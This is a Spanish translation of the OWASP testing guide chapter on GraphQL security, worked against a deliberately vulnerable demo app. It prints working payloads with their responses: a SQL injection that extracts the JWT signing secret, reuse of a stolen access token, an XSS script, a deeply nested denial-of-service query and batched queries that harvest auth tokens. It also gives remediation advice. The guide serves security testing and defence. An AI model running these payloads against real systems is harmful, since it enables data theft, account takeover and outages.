# Pruebas de GraphQL

|ID |
|------------|
|WSTG-APIT-99|

## Resumen

GraphQL se ha vuelto muy popular en las API modernas. Ofrece simplicidad y objetos anidados, lo que facilita un desarrollo más rápido. Si bien cada tecnología tiene ventajas, también puede exponer la aplicación a nuevas superficies de ataque. El propósito de este escenario es mostrar algunas configuraciones erróneas y vectores de ataque comunes en aplicaciones que utilizan GraphQL. Algunos vectores son exclusivos de GraphQL (p. ej., [Consulta de introspección](#introspection-queries)) y otros son genéricos para las API (p. ej., [Inyección SQL](#sql-injection)).

Los ejemplos de esta sección se basan en una aplicación GraphQL vulnerable [poc-graphql](https://github.com/righettod/poc-graphql), que se ejecuta en un contenedor Docker que asigna `localhost:8080/GraphQL` como el nodo GraphQL vulnerable.

## Objetivos de la prueba

- Evaluar que se haya implementado una configuración segura y lista para producción.
- Validar todos los campos de entrada contra ataques genéricos.
- Asegurarse de que se apliquen los controles de acceso adecuados.

## Cómo realizar pruebas

Probar nodos GraphQL no es muy diferente a probar otras tecnologías API. Considere los siguientes pasos:

### Consultas de introspección

Las consultas de introspección son el método mediante el cual GraphQL le permite preguntar qué consultas son compatibles, qué tipos de datos están disponibles y muchos otros detalles que necesitará al probar una implementación de GraphQL.

El [sitio web de GraphQL describe la introspección](https://graphql.org/learn/introspection/):

> "A menudo es útil solicitar información a un esquema GraphQL sobre las consultas que admite. GraphQL nos permite hacerlo mediante el sistema de introspección".

Hay un par de maneras de extraer esta información y visualizar el resultado, como se indica a continuación.

#### Uso de la introspección nativa de GraphQL

La forma más sencilla es enviar una solicitud HTTP (mediante un proxy personal) con la siguiente carga útil, extraída de un artículo en [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

El resultado suele ser muy largo (por lo que se ha acortado aquí) y contendrá el esquema completo de la implementación de GraphQL.

Respuesta:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```
Se puede usar una herramienta como [GraphQL Voyager](https://apis.guru/graphql-voyager/) para comprender mejor el endpoint de GraphQL:

![GraphQL Voyager](images/Voyager.png)\
*Figura 12.1-1: GraphQL Voyager*

Esta herramienta crea una representación del esquema GraphQL mediante un Diagrama de Entidad-Relación (DRE), lo que permite comprender mejor las partes móviles del sistema que se está probando. Extraer información del diagrama permite ver si se puede consultar la tabla "Perro", por ejemplo. También muestra las propiedades de un perro:

- ID
- nombre
- veterinario (ID)

Este método tiene una desventaja: GraphQL Voyager no muestra todas las funciones disponibles con GraphQL. Por ejemplo, las mutaciones disponibles no se muestran en el diagrama anterior. Una mejor estrategia sería usar tanto Voyager como uno de los métodos que se enumeran a continuación.

#### Uso de GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) es un IDE web para GraphQL. Forma parte del proyecto GraphQL y se utiliza principalmente para fines de depuración y desarrollo. Se recomienda no permitir el acceso de los usuarios en implementaciones de producción. Si está probando un entorno de pruebas, podría tener acceso a él y, por lo tanto, ahorrar tiempo al trabajar con consultas de introspección (aunque, por supuesto, puede usar la introspección en la interfaz de GraphiQL).

GraphiQL cuenta con una sección de documentación que utiliza los datos del esquema para crear un documento de la instancia de GraphQL utilizada. Este documento contiene los tipos de datos, las mutaciones y, básicamente, toda la información que se puede extraer mediante la introspección.

#### Uso de GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) es un cliente GraphQL. Permite probar diferentes consultas, así como dividir los IDE GraphQL en diferentes entornos de juego y agruparlos por tema o nombre. Al igual que GraphQL, Playground crea documentación automáticamente sin necesidad de enviar manualmente consultas de introspección ni procesar las respuestas. Tiene otra gran ventaja: no requiere que la interfaz de GraphQL esté disponible. Puede dirigir la herramienta al nodo GraphQL mediante una URL o usarla localmente con un archivo de datos. GraphQL Playground permite probar vulnerabilidades directamente, por lo que no necesita un proxy personal para enviar solicitudes HTTP. Esto significa que puede usar esta herramienta para interactuar y evaluar GraphQL de forma sencilla. Para cargas útiles más avanzadas, utilice un proxy personal.

Tenga en cuenta que, en algunos casos, deberá configurar los encabezados HTTP en la parte inferior para incluir el ID de sesión u otro mecanismo de autenticación. Esto permite crear varios IDE con diferentes permisos para verificar si existen problemas de autorización.

![Playground1](images/Playground1.png)\
*Figura 12.1-2: Documentación de la API de alto nivel de GraphQL Playground*

![Playground2](images/Playground2.png)\
*Figura 12.1-3: Esquema de la API de GraphQL Playground*

Incluso puedes descargar los esquemas para usarlos en Voyager.

#### Conclusión sobre la introspección

La introspección es una herramienta útil que permite a los usuarios obtener más información sobre la implementación de GraphQL. Sin embargo, esto también permite que usuarios maliciosos accedan a la misma información. Se recomienda limitar el acceso a las consultas de introspección, ya que algunas herramientas o solicitudes podrían fallar si esta función se deshabilita por completo. Dado que GraphQL suele conectar con las API de backend del sistema, es mejor implementar un control de acceso estricto.

### Autorización

La introspección es el primer paso para detectar problemas de autorización. Como se mencionó, el acceso a la introspección debe restringirse, ya que permite la extracción y recopilación de datos. Una vez que un tester tiene acceso al esquema y conoce la información confidencial que se debe extraer, debe enviar consultas que no se bloqueen por falta de privilegios. GraphQL no impone permisos por defecto, por lo que la aplicación es responsable de la imposición de la autorización.

En los ejemplos anteriores, el resultado de la consulta de introspección muestra una consulta llamada `auth`. Este parece ser un buen lugar para extraer información confidencial, como tokens de API, contraseñas, etc.

![Consulta de autenticación GraphQL](images/auth1.png)\
*Figura 12.1-4: API de consulta de autenticación GraphQL*

La prueba de la implementación de la autorización varía según la implementación, ya que cada esquema tendrá diferente información confidencial y, por lo tanto, diferentes objetivos en los que centrarse.

En este ejemplo vulnerable, cualquier usuario (incluso no autenticado) puede acceder a los tokens de autenticación de todos los veterinarios registrados en la base de datos. Estos tokens se pueden usar para realizar acciones adicionales permitidas por el esquema, como asociar o desasociar un perro de cualquier veterinario especificado mediante mutaciones, incluso si no hay un token de autenticación coincidente para el veterinario en la solicitud.

A continuación, se muestra un ejemplo en el que el evaluador usa un token extraído que no le pertenece para realizar una acción como el veterinario "Benoit":

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

y el response:

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```
Todos los perros de la lista pertenecen a Benoit, no al propietario del token de autenticación. Es posible realizar este tipo de acción cuando no se implementa la correcta aplicación de la autorización.

### Inyección

GraphQL es la implementación de la capa API de una aplicación y, como tal, suele reenviar las solicitudes directamente a una API de backend o a la base de datos. Esto permite aprovechar cualquier vulnerabilidad subyacente, como la inyección SQL, la inyección de comandos, los scripts entre sitios, etc. Usar GraphQL simplemente cambia el punto de entrada de la carga maliciosa.

Puede consultar otros escenarios en la guía de pruebas de OWASP para obtener más ideas.

GraphQL también incluye escalares, que suelen usarse para tipos de datos personalizados que no tienen tipos de datos nativos, como DateTime. Estos tipos de datos no cuentan con validación predefinida, lo que los convierte en buenos candidatos para las pruebas.

#### Inyección SQL

La aplicación de ejemplo es vulnerable por diseño en la consulta `dogs(namePrefix: String, limit: Int = 500): [Dog!]`, ya que el parámetro `namePrefix` está concatenado en la consulta SQL. Concatenar la entrada del usuario es una práctica común en las aplicaciones que puede exponerlas a la inyección SQL.

La siguiente consulta extrae información de la tabla `CONFIG` de la base de datos:

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

La respuesta de este query es:

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

La consulta contiene el secreto que firma los JWT en la aplicación de ejemplo, información muy sensible.

Para saber qué buscar en cada aplicación, es útil recopilar información sobre su compilación y la organización de las tablas de la base de datos. También puede usar herramientas como `sqlmap` para buscar rutas de inyección e incluso automatizar la extracción de datos de la base de datos.

#### Cross-Site Scripting (XSS)

El cross-site scripting ocurre cuando un atacante inyecta código ejecutable que posteriormente ejecuta el navegador. Obtenga más información sobre las pruebas de XSS en el capítulo [Validación de entrada](../07-Input_Validation_Testing/README.md). Puede comprobar si hay XSS reflejado utilizando una carga útil de [Pruebas de Cross Site Scripting Reflejadas](../07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md).

En este ejemplo, los errores podrían reflejar la entrada y provocar un XSS.
Payload:

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Response:

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

Consultas de Denegación de Servicio (DoS)

GraphQL expone una interfaz muy sencilla que permite a los desarrolladores usar consultas y objetos anidados. Esta función también puede utilizarse de forma maliciosa, invocando una consulta profunda anidada similar a una función recursiva, lo que provoca una denegación de servicio al consumir CPU, memoria u otros recursos informáticos.

En la *Figura 12.1-1*, se puede observar que es posible crear un bucle donde un objeto "Perro" contiene un objeto "Veterinario". Podría haber una cantidad infinita de objetos anidados.

Esto permite una consulta profunda que podría sobrecargar la aplicación:

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```
Existen múltiples medidas de seguridad que se pueden implementar para prevenir este tipo de consultas, las cuales se detallan en la sección [Remediación](#remediación). Las consultas abusivas pueden causar problemas como ataques de denegación de servicio (DoS) en implementaciones de GraphQL y deben incluirse en las pruebas.

### Ataques por lotes

GraphQL permite agrupar múltiples consultas en una sola solicitud. Esto permite a los usuarios solicitar múltiples objetos o instancias de objetos de forma eficiente. Sin embargo, un atacante puede utilizar esta funcionalidad para realizar un ataque por lotes. El envío de más de una consulta en una sola solicitud se ve así:

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

En la aplicación de ejemplo, se puede enviar una sola solicitud para extraer todos los nombres de los veterinarios utilizando el ID deducible (un entero creciente). Un atacante puede entonces utilizar los nombres para obtener tokens de acceso. En lugar de hacerlo en múltiples solicitudes, que podrían ser bloqueadas por una medida de seguridad de red como un firewall de aplicaciones web o un limitador de velocidad como Nginx, estas solicitudes pueden agruparse. Esto significa que solo habría un par de solicitudes, lo que podría permitir un ataque de fuerza bruta eficiente sin ser detectado. A continuación, se muestra un ejemplo de consulta:

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

Esto proporcionará al atacante los nombres de los veterinarios y, como se mostró anteriormente, estos nombres pueden usarse para realizar múltiples consultas solicitando los tokens de autenticación de dichos veterinarios. Por ejemplo:

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```
Los ataques por lotes pueden utilizarse para eludir muchas medidas de seguridad implementadas en los sitios web. También pueden utilizarse para enumerar objetos e intentar forzar la autenticación multifactor u otra información confidencial.

### Mensaje de error detallado

GraphQL puede encontrar errores inesperados durante la ejecución. Cuando se produce un error de este tipo, el servidor puede enviar una respuesta de error que puede revelar detalles internos del error, configuraciones o datos de la aplicación. Esto permite que un usuario malintencionado obtenga más información sobre la aplicación. Como parte de las pruebas, se deben comprobar los mensajes de error mediante el envío de datos inesperados, un proceso conocido como fuzzing. Se debe buscar información potencialmente confidencial en las respuestas que pueda revelarse mediante esta técnica.

### Exposición de la API subyacente

GraphQL es una tecnología relativamente nueva, y algunas aplicaciones están migrando de API antiguas a GraphQL. En muchos casos, GraphQL se implementa como una API estándar que traduce las solicitudes (enviadas mediante la sintaxis GraphQL) a una API subyacente, así como las respuestas. Si las solicitudes a la API subyacente no se verifican correctamente para verificar su autorización, podría producirse una escalada de privilegios.

Por ejemplo, una solicitud que contenga el parámetro `id=1/delete` podría interpretarse como `/api/users/1/delete`. Esto podría extenderse a la manipulación de otros recursos pertenecientes a `user=1`. También es posible que la solicitud se interprete como si la autorización se otorgara al nodo GraphQL, en lugar del solicitante real.

Un tester debería intentar obtener acceso a los métodos de la API subyacente, ya que podría ser posible una escalada de privilegios.

## Solución

- Restringir el acceso a las consultas de introspección.
- Implementar la validación de entrada.
- GraphQL no cuenta con una forma nativa de validar la entrada; sin embargo, existe un proyecto de código abierto llamado ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) que permite la validación de entrada como parte de la definición del esquema. La validación de entrada por sí sola es útil, pero no es una solución completa, por lo que se deben tomar medidas adicionales para mitigar los ataques de inyección.

Implementar medidas de seguridad para evitar consultas abusivas.

Tiempos de espera: restringir el tiempo de ejecución permitido para una consulta.

Profundidad máxima de consulta: limitar la profundidad de las consultas permitidas, lo que puede evitar que las consultas demasiado profundas abusen de los recursos.

Establecer la complejidad máxima de la consulta: limitar la complejidad de las consultas para mitigar el abuso de los recursos de GraphQL.

Usar limitación basada en el tiempo del servidor: limitar el tiempo del servidor que un usuario puede consumir.

Usar limitación basada en la complejidad de la consulta: limitar la complejidad total de las consultas que un usuario puede consumir.

Enviar mensajes de error genéricos: utilizar mensajes de error genéricos que no revelen detalles de la implementación.

Mitigar los ataques por lotes:

Añadir limitación de la tasa de solicitud de objetos en el código.

Evitar el procesamiento por lotes de objetos sensibles.

Limitar el número de consultas que se pueden ejecutar simultáneamente.

Para más información sobre cómo corregir las vulnerabilidades de GraphQL, consulta la [Hoja de referencia de GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).

## Herramientas
- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (Burp Extension)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider (Burp Extension)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (Add-on for ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)

## Referencias

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [GraphQL Official Site](https://graphql.org/learn/)
- [Howtographql - Security](https://www.howtographql.com/advanced/4-security/)
- [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
- [Client-side Testing](../11-Client-side_Testing/README.md) (XSS and other vulnerabilities)
- [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
